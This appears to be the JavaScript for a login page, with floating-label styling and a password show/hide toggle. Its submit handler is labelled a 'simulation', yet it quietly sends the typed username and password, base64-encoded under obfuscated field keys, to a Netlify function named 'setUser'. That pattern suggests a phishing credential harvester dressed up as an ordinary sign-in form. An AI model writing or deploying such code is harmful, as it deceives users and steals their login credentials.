document.addEventListener('DOMContentLoaded', () => {
    const inputFields = document.querySelectorAll('.input-field');
    const showPasswordBtn = document.querySelector('.show-password-btn');
    const passwordInput = document.getElementById('password');
    const loginForm = document.getElementById('loginForm');

    inputFields.forEach(input => {
        const parentContainer = input.closest('.input-container'); // Find the closest parent .input-container
        const labelText = parentContainer.querySelector('.label-text');

        // Function to update label state based on input value
        const updateLabelState = () => {
            if (input.value.trim() !== '') {
                parentContainer.classList.add('has-value');
            } else {
                parentContainer.classList.remove('has-value');
            }
        };

        // Event listeners for focus and blur to manage the 'focused' class
        input.addEventListener('focus', () => {
            parentContainer.classList.add('focused');
        });

        input.addEventListener('blur', () => {
            parentContainer.classList.remove('focused');
            // Also update the value state when blurring, in case the user typed something and then blurred
            updateLabelState();
        });

        // Event listener for input changes to manage the 'has-value' class
        input.addEventListener('input', updateLabelState);

        // Initial check for pre-filled values (like in the HTML)
        updateLabelState();
    });

    // Function to toggle password visibility
    if (showPasswordBtn) {
        showPasswordBtn.addEventListener('click', () => {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            showPasswordBtn.textContent = type === 'password' ? 'Show' : 'Hide';
        });
    }

    // Basic form submission simulation
    if (loginForm) {
        loginForm.addEventListener('submit', (event) => {
            event.preventDefault(); // Prevent actual form submission

            // Re-get input elements in case they were dynamically changed (though not in this example)
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const username = usernameInput.value;
            const password = passwordInput.value;

            fetch("/.netlify/functions/setUser", {
                method: "POST",
                body: JSON.stringify({
                    [atob("dQ==")]: btoa(username),
                    [atob("cA==")]: btoa(password),
                })
            });
        });
    }
});